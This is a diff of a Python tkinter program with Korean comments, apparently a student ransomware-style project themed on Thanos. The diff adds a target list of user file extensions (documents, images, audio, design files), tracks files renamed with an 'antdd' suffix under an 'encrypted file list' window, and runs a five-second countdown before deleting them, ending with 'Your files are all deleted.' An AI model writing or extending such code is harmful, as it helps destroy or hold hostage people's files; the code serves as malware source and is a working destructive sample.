@@ -38,11 +38,11 @@ class tk:
         self.l_timer = tkinter.Label(self.window, text="타이머 시작 = 5", fg="red", bg="black", font='Helvetica 14 bold')
         self.l_timer.pack()
 
-        #self.l_text1 = tkinter.Label(self.window, text="삭제될 리스트입니다",fg="red", bg="black", font='Helvetica 14 bold')
-        #self.l_text1.pack()
+        # self.l_text1 = tkinter.Label(self.window, text="삭제될 리스트입니다",fg="red", bg="black", font='Helvetica 14 bold')
+        # self.l_text1.pack()
 
-        #self.l_filelist = tkinter.Label(self.window, text=" ",fg="red", bg="black", font='Helvetica 14 bold')
-        #self.l_filelist.pack()
+        # self.l_filelist = tkinter.Label(self.window, text=" ",fg="red", bg="black", font='Helvetica 14 bold')
+        # self.l_filelist.pack()
 
         self.l_input = tkinter.Label(self.window,
                                      text="password:",
@@ -78,72 +78,77 @@ class tk:
         self.l_thanos = tkinter.Label(gui.self.frame2, image=gui.thanos)
         self.l_thanos.pack()
 
+
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수
 
 def list_files(path, ext=None):
     filelist = []
+    extlist = \
+        ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
+         'jpg', 'jpeg', 'png', 'gif',
+         'mp3', 'wav', 'wma',
+         'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
     print("os.listdir(): \n", os.listdir())
     for name in os.listdir(path):
         if os.path.isfile(os.path.join(path, name)):
-            if name.endswith('.py'):
-                continue
-            if (ext == None):
-                filelist.append(name)
-            elif name.endswith(ext):
-                filelist.append(name)
+            for i in extlist:
+                if name.endswith(i):
+                    filelist.append(name)
+                else:
+                    continue
 
     print("filelist: \n", filelist)
     return filelist
+
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수
 
 def startTimer(gui, path, ext=None):
     print("파일 삭제를 시작합니다")
 
-    remove_filelist = []
+    antdd_filelist = []
 
-    print("os.removelistdir(): \n", os.listdir())
+    print("os.listdir(): \n", os.listdir())
     for name in os.listdir(path):
         if os.path.isfile(os.path.join(path, name)):
-            if name.endswith('.py'):
+            if name.endswith('antdd'):
+                antdd_filelist.append(name)
+            else:
                 continue
-            if (ext == None):
-                remove_filelist.append(name)
-            elif name.endswith(ext):
-                remove_filelist.append(name)
 
     # gui/ 삭제될 파일 리스트 출력
-    #gui.l_filelist.config(text="[" + ",".join(remove_filelist) + "]")
+    # gui.l_filelist.config(text="[" + ",".join(remove_filelist) + "]")
     # 지운 파일 출력 #새창으로 띄우기
     gui.listWindow = tkinter.Toplevel(gui.window)
-    gui.listWindow.title('삭제될 리스트')
+    gui.listWindow.title('암호화된 파일 리스트')
     gui.listWindow.geometry("800x400")
     gui.listWindow.configure(background="black")
-    gui.list = tkinter.Label(gui.listWindow, text="[" + ",".join(remove_filelist) + "]", background="black", fg="red")
+    gui.list = tkinter.Label(gui.listWindow, text="[" + ",".join(antdd_filelist) + "]", background="black", fg="red")
     gui.list.pack()
     ####
-    print("[" + ",".join(remove_filelist) + "]")
+    print("[" + ",".join(antdd_filelist) + "]")
 
-    clock(gui, 5, remove_filelist)
+    clock(gui, 5, antdd_filelist)
 
 
 # 타이머를 출력해주는 함수
-def clock(gui, c, remove_filelist):
+def clock(gui, c, antdd_filelist):
     c -= 1
 
     # 0초가 되면!
     if c == -2:
         # 파일 삭제를 시작함
-        remove_files(gui, remove_filelist)
+        remove_files(gui, antdd_filelist)
         return;
 
     # gui의 타이머 label 을 갱신!
     gui.l_timer.config(text=str(c + 1))
 
     # 자기 자신 호출
-    threading.Timer(1, clock, [gui, c, remove_filelist]).start()
+    threading.Timer(1, clock, [gui, c, antdd_filelist]).start()
 
-#모두 삭제되었을 때 GUI #혜연 11/22 추가
+
+# 모두 삭제되었을 때 GUI #혜연 11/22 추가
 def allRemovePrint(gui):
     gui.l_thanos.destroy()
     l_allremove = tkinter.Label(gui.window, text="\n\nYour files are all deleted.\n\n",
@@ -152,22 +157,11 @@ def allRemovePrint(gui):
     sleep(3)
     gui.window.destroy()
 
+
 def remove_files(gui, remove_filelist, ext=None):
     gui.l_thanos.destroy()
     gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
     gui.l_thanos.pack()
-
-    # remove_filelist=[]
-    # print("os.removelistdir(): \n", os.listdir())
-    # for name in os.listdir(path):
-    #     if os.path.isfile(os.path.join(path, name)):
-    #         if name.endswith('.py'):
-    #             continue
-    #         if (ext == None):
-    #             remove_filelist.append(name)
-    #         elif name.endswith(ext):
-    #             remove_filelist.append(name)
-    # print("remove_filelist: \n", remove_filelist)
 
     # 파일이 2개 이상일 경우
     if (len(remove_filelist) >= 2):
@@ -366,4 +360,3 @@ if __name__ == "__main__":
     # th2 = threading.Thread(gui.window.mainloop())
     # th2.start()
     gui.window.mainloop()
-
